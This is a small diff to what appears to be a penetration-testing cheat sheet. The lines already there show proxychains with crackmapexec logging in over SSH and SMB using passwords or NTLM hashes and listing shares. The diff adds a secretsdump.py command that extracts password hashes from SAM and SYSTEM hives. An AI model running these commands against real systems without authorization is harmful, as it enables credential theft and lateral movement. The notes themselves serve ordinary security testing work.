@@ -772,6 +772,11 @@ proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD
 
 proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
    #+end_example
+
+   Dump hashes from SAM and SYSTEM hives locally
+   #+begin_example
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+   #+end_example
    
    --------------------
 
